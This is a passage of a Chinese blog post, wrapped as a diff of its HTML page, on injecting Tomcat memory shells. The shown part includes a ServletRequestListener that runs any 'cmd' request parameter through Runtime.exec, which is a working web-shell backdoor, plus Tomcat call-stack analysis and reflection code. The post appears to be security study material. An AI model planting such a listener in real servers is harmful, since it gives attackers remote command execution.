@@ -1,0 +1,1245 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Tomcat内存马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat内存马">
+<meta property="og:url" content="https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="清风的博客">
+<meta property="og:description" content="Tomcat内存马">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240301165810-t0uke8b.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302090547-6cnrs9c.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091423-nb4heks.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091451-t8eozkt.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091559-2cfgkhr.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091930-rz44pjr.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302092238-ic9set6.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302110337-pd1ucxt.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303095319-e0o5wdy.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303100009-s0l5xmk.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303104134-sfasxfo.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303104918-hnewqap.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303154255-5jyu8c0.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303164012-0xhdsy1.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240304091722-0ui67ht.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240304094737-5jsr7mg.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240304105955-z9h86s9.png">
+<meta property="article:published_time" content="2024-03-04T04:03:34.000Z">
+<meta property="article:modified_time" content="2024-03-04T04:07:07.983Z">
+<meta property="article:author" content="清风">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qingfeng.tech/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240301165810-t0uke8b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Tomcat内存马</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/01/05/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/&text=Tomcat内存马"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat内存马"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=Tomcat内存马"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tomcat内存马&body=Check out this article: https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat内存马"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat内存马"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat内存马"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat内存马"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/&name=Tomcat内存马&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qingfeng.tech/2024/03/04/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/&t=Tomcat内存马"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">Tomcat内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">Listener型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5-%E6%B7%BB%E5%8A%A0%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">第一步 添加监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5-%E8%8E%B7%E5%8F%96ServletContext"><span class="toc-number">1.2.2.</span> <span class="toc-text">第二步 获取ServletContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">POC：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">Filter型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5-%E8%8E%B7%E5%8F%96ServletContext"><span class="toc-number">1.3.1.</span> <span class="toc-text">第一步 获取ServletContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5-%E8%AE%BE%E7%BD%AEFilterDef"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二步 设置FilterDef</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5-%E8%AE%BE%E7%BD%AEFilterMap"><span class="toc-number">1.3.3.</span> <span class="toc-text">第三步 设置FilterMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5-%E5%8C%85%E8%A3%85FilterDef%E5%92%8CFilterConfig"><span class="toc-number">1.3.4.</span> <span class="toc-text">第四步 包装FilterDef和FilterConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.3.5.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.4.</span> <span class="toc-text">Servlet型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#valve%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.5.</span> <span class="toc-text">valve型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Tomcat内存马
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">清风</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-04T04:03:34.000Z" class="dt-published" itemprop="datePublished">2024-03-04</time>
+        
+        (Updated: <time datetime="2024-03-04T04:07:07.983Z" class="dt-updated" itemprop="dateModified">2024-03-04</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <hr>
+<h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>描述Servlet3.0后允许动态注册组件</p>
+<p>这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。</p>
+<p>而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat-catalina<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>9.0.55<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><strong>关键在于 JSP-&gt;可识别类（恶意类）</strong></p>
+<p>所以需要看写在java文件中被系统调用时的堆栈过程，利用jsp技术把这个注册过程写入jsp，在访问jsp之后就会执行这个逻辑以此注入内存马</p>
+<pre class=" language-xml"><code class="language-xml">问题1：
+注入内存马之后是访问就会触发动态注册的动作还是注入就自动执行动态注册的动作？访问后生效
+</code></pre>
+<h2 id="Listener型内存马"><a href="#Listener型内存马" class="headerlink" title="Listener型内存马"></a>Listener型内存马</h2><p>Servlet有三种监听器：</p>
+<ul>
+<li>ServletContextListener</li>
+<li>HttpSessionListener</li>
+<li>ServletRequestListener</li>
+</ul>
+<p>这三种最合适的莫过于ServletRequestListener，只要访问Servlet的任何资源都会触发这个监听器</p>
+<p>创建Listener：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletRequest<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletRequestEvent<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletRequestListener<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>WebListener<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+
+<span class="token annotation punctuation">@WebListener</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletListener</span> <span class="token keyword">implements</span> <span class="token class-name">ServletRequestListener</span> <span class="token punctuation">{</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestDestroyed</span> <span class="token punctuation">(</span>ServletRequestEvent sre<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"requestDestroyed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestInitialized</span> <span class="token punctuation">(</span>ServletRequestEvent sre<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        ServletRequest servletRequest <span class="token operator">=</span> sre<span class="token punctuation">.</span><span class="token function">getServletRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String cmd <span class="token operator">=</span> servletRequest<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>验证：</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240301165810-t0uke8b.png" alt="image">​</p>
+<p>调用堆栈如下：</p>
+<pre class=" language-sh"><code class="language-sh">requestInitialized:13, Shell_Listener (org.example.demo)
+fireRequestInitEvent:5638, StandardContext (org.apache.catalina.core)
+invoke:116, StandardHostValve (org.apache.catalina.core)
+invoke:93, ErrorReportValve (org.apache.catalina.valves)
+invoke:670, AbstractAccessLogValve (org.apache.catalina.valves)
+invoke:74, StandardEngineValve (org.apache.catalina.core)
+service:342, CoyoteAdapter (org.apache.catalina.connector)
+service:390, Http11Processor (org.apache.coyote.http11)
+process:63, AbstractProcessorLight (org.apache.coyote)
+process:928, AbstractProtocol$ConnectionHandler (org.apache.coyote)
+doRun:1794, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
+run:52, SocketProcessorBase (org.apache.tomcat.util.net)
+runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
+run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
+run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
+run:745, Thread (java.lang)
+</code></pre>
+<p>调用Listener的关键步骤<code>fireRequestInitEvent:5638, StandardContext (org.apache.catalina.core)</code>​</p>
+<p>跟进看函数逻辑：</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">fireRequestInitEvent</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        Object instances<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>instances <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>instances<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            ServletRequestEvent event <span class="token operator">=</span>
+                    <span class="token keyword">new</span> <span class="token class-name">ServletRequestEvent</span><span class="token punctuation">(</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span>Object instance <span class="token operator">:</span> instances<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>instance <span class="token keyword">instanceof</span> <span class="token class-name">ServletRequestListener</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                ServletRequestListener listener <span class="token operator">=</span> <span class="token punctuation">(</span>ServletRequestListener<span class="token punctuation">)</span> instance<span class="token punctuation">;</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    listener<span class="token punctuation">.</span><span class="token function">requestInitialized</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    ExceptionUtils<span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>
+                            <span class="token string">"standardContext.requestListener.requestInit"</span><span class="token punctuation">,</span>
+                            instance<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>RequestDispatcher<span class="token punctuation">.</span>ERROR_EXCEPTION<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>简单分析一下创建监听器的流程：</p>
+<pre class=" language-xml"><code class="language-xml">1.获取当前上下文的所有监听器
+2.获取StandardContext上下文
+3.创建监听器
+</code></pre>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302090547-6cnrs9c.png" alt="image">​</p>
+<p>所以利用jsp技术动态创建监听器也是一样的道理</p>
+<h3 id="第一步-添加监听器"><a href="#第一步-添加监听器" class="headerlink" title="第一步 添加监听器"></a>第一步 添加监听器</h3><p>首先就是添加监听器，跟进<code>getApplicationEventListeners</code>​函数</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091423-nb4heks.png" alt="image">​</p>
+<p>继续跟进<code>applicationEventListenersList</code>​</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091451-t8eozkt.png" alt="image">​</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091559-2cfgkhr.png" alt="image">​</p>
+<p>发现这个属性就可以直接添加监听器了</p>
+<p>跟进：</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091930-rz44pjr.png" alt="image">​</p>
+<p>是<code>addApplicationEventListener</code>​函数可以添加监听器，那么第一步就解决了</p>
+<p>这里注意的就是这个<code>StandardContext</code>​类的，后面jsp的时候获取也是<code>StandardContext</code>​类，但是只有<code>getServletContext</code>​这个方法，所以获取他的父类Context，使用<code>getContext</code>​方法</p>
+<h3 id="第二步-获取ServletContext"><a href="#第二步-获取ServletContext" class="headerlink" title="第二步 获取ServletContext"></a>第二步 获取ServletContext</h3><p><code>invoke:116, StandardHostValve (org.apache.catalina.core)</code>​这一步可以发现他获取servlet的方式：</p>
+<p> <img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302092238-ic9set6.png" alt="image">​</p>
+<p>恰好jsp也内置了request，所以这里也是可以利用</p>
+<p>只需要反射利用Field获取即可</p>
+<pre class=" language-java"><code class="language-java">Field requestField <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+requestField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Request requests <span class="token operator">=</span> <span class="token punctuation">(</span>Request<span class="token punctuation">)</span> requestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>这里回顾的时候有点太久没学反射了，把request.get(obj)和request.get(null)给搞混了</p>
+<p>这里有两个例子(返回的结果都是<code>Hello, qingfeng!</code>​)，运行一下就能会议起来了</p>
+<pre class=" language-java"><code class="language-java">例一<span class="token punctuation">[</span>Field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">]</span>
+<span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IllegalAccessException <span class="token punctuation">{</span>
+        MyClass obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 获取 Class 对象</span>
+        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 获取字段的值</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            Field field <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"myField"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "myField" 是字段的名称</span>
+            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置为可访问，以便获取或设置私有字段的值</span>
+
